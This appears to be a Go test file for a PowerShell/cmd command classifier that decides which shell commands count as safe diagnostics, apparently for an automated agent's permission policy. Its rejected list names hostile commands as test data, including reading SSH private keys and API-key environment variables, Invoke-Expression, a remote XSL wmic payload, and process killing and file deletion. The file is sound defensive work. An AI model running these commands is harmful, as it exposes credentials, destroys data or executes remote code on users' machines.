package sysadmin

import "testing"

func TestIsDiagnosticPSAllowed(t *testing.T) {
	ok := []string{
		`dir "F:\" /s /b | findstr /i "pistol"`,
		`wmic cpu get loadpercentage /format:list`,
		`wmic cpu get loadpercentage /format:list & wmic path win32_VideoController get name`,
		`wmic /namespace:\\root\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature /value`,
		`if (Test-Path F:/) { Get-ChildItem F:/ -Recurse -Depth 5 -Filter *.exe | Where-Object { $_.Name -match 'metro' } | Select-Object -First 40 FullName } else { 'no F:' }`,
		`Get-PSDrive D | Select-Object Used,Free,@{n='UsedGB';e={[math]::Round($_.Used/1GB,1)}}`,
		`Get-Process | Where-Object { $_.ProcessName -like '*metro*' } | Select-Object Id,ProcessName,Path`,
		`Start-Sleep -Seconds 2; Get-Process -Id 100 2>&1`,
		`tasklist | findstr /i metro`,
		`Get-CimInstance Win32_OperatingSystem | Format-List FreePhysicalMemory`,
		`Get-PSDrive | ForEach-Object { $_.Name }`,
		`$p = Get-Process metroexodus; $p.Id`,
		`nvidia-smi`,
		`typeperf "\Memory\Available MBytes" -sc 2`,
		`ping -n 2 8.8.8.8`,
		`netstat -ano | findstr :8080`,
		`Test-Connection 8.8.8.8 -Count 2`,
		`Start-Sleep 5; Get-Process metroexodus`,
		`wmic cpu get name /format:list`,
		`dir C:\Users\*\Desktop\*.lnk`,
	}
	for _, c := range ok {
		if !IsDiagnosticPS(c) {
			t.Errorf("must be diagnostic: %s", c)
		}
	}
}

func TestIsDiagnosticPSRejected(t *testing.T) {
	bad := []string{
		``,
		`Stop-Process -Id 100 -Force`,
		`taskkill /IM MetroExodus.exe /F`,
		`Get-Process | ForEach-Object { $_.Kill() }`,
		`Get-Process | % Kill`,
		`Get-Process | foreach Kill`,
		`Get-Process | ForEach-Object -MemberName Kill`,
		`Get-ChildItem | Remove-Item`,
		`Get-ChildItem | rm`,
		`dir F:\ > out.txt`,
		`Get-Content a.txt | Out-File b.txt`,
		`if ($true) { return rm x }`,
		`if ($true) { } else rm x`,
		`$x = 'calc'; & $x`,
		`& "C:\Windows\calc.exe"`,
		`. .\run.ps1`,
		`Invoke-Expression 'calc'`,
		`'calc' | iex`,
		`[System.Diagnostics.Process]::Start('calc')`,
		`[IO.File]::WriteAllText('a','b')`,
		`(Get-Process notepad).Kill()`,
		`Get-ChildItem Env:`,
		`Get-Clipboard`,
		`Get-Credential`,
		`ConvertFrom-SecureString $s`,
		`wmic process call create calc`,
		`wmic process where name='x' delete`,
		`wmic /node:other cpu get name`,
		`sort /o out.txt in.txt`,
		`ipconfig /release`,
		`arp -d`,
		`Set-ItemProperty HKLM:\x y 1`,
		`Get-Content C:\Users\Admin\.ssh\id_ed25519`,
		`Start-Process calc`,
		"Get-Process `\n| Stop-Process",
		`cmd /c del x`,
		`powershell -c rm x`,
		`rm x`,
		`del x`,
		`New-Item x`,
		`[void] rm x`,
		`Get-Date; $a=$b=$c=$d=$e=rm C:\x`,
		`Get-Date; foreach ($x in rm C:\f) {}`,
		`Get-Date; while(1){}`,
		`Get-Date; for(;;){}`,
		`Get-Process | ForEach-Object { $_.'Kill'() }`,
		`[System.Diagnostics.Process]::'Start'('calc')`,
		`$s=[scriptblock]'rm x'; $s.Invoke()`,
		`wmic os get name /format:"http://x/e.xsl"`,
		`wmic os get name /format:evil.xsl`,
		`Get-Date; 7z a -sdel x`,
		`gci env:`,
		`gci "env:"`,
		`gci Env:A*`,
		`gi env:KEY`,
		`$env:KEY`,
		`Get-Date; $env:PATH = 'x'`,
		`Get-Process | ForEach-Object { $_.PriorityClass = 'Idle' }`,
		`Get-Content \\host\share\x`,
		`Get-Content C:\x -Wait`,
		`wmic cpu get name /every:1`,
		`netstat -an 1`,
		`ping -t 8.8.8.8`,
		`Start-Sleep -Seconds 100000`,
		`get-clip*`,
		`Get-Date; (Get-Process x).Kill()`,
		`Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'`,
		`tasklist /s other /u x`,
		`Get-Date; calc = 1`,
		`Get-Date; $c='rm C:\a'; powershell = -Command $c`,
		`wmic /append:out.txt cpu get name`,
		`wmic /user:x cpu get name`,
		`wmic process where name='x' call terminate`,
		`typeperf "\Memory\Available MBytes"`,
		`typeperf "\Memory\Available MBytes" -sc 100`,
		`ping -n 1000000 host`,
		`ping -w 100000 host`,
		`netstat -an "1"`,
		`netstat -an $i`,
		`Get-Content f -Wai`,
		`Get-Counter -Cont`,
		`Get-Counter -MaxSamples 1000000000`,
		`Test-Connection h -Count 99999999`,
		`Start-Sleep -Seconds (100000)`,
		`Start-Sleep 60; Start-Sleep 60; Start-Sleep 60`,
		`1..1000 | % { Start-Sleep 60 }`,
		`1..2000000000 | % { $_ }`,
		`$a=1; $a..$a | % { $_ }`,
		"gc $env:userprofile\\.s*\\id_*",
		`gc ('C:\Users\Admin\.s'+'sh\k')`,
		`gci ~\.s* -Force`,
		`gc C:\a\b.pem`,
		`gc C:\a\.env`,
		`Get-WmiObject Win32_Environment`,
		`wmic environment list`,
		`Get-Item a.txt | % { $_.Replace('b','c') }`,
		`gc \/host/share/x`,
		`Get-WmiObject Win32_OperatingSystem -ComputerName h`,
		`Get-WmiObject Win32_OperatingSystem -Cn h`,
		`Get-CimInstance Win32_OS -CimSession x`,
		`systeminfo /s h`,
		`Get-Help Get-Date -Online`,
		`Get-Process | % { $_.MinWorkingSet++ }`,
		`echo %OPENAI_API_KEY%`,
		`Get-Date; $p.Kill ()`,
		`findstr /i "api_key" C:\Users\*`,
	}
	for _, c := range bad {
		if IsDiagnosticPS(c) {
			t.Errorf("must NOT be diagnostic: %q", c)
		}
	}
}

func TestDecideDiagnosticNoAsk(t *testing.T) {
	p := &Policy{Default: ModeAsk}
	if m, _ := p.DecideShellOS(`dir "F:\" /s /b | findstr /i "pistol"`, true); m != ModeAllow {
		t.Errorf("file search must be allowed, got %v", m)
	}
	if m, _ := p.DecideShellOS(`taskkill /IM MetroExodus.exe /F`, true); m == ModeAllow {
		t.Errorf("taskkill must not be silently allowed")
	}
	if m, _ := p.DecideShellOS(`which service`, false); m != ModeAllow {
		t.Errorf("which must be allowed on linux, got %v", m)
	}
}
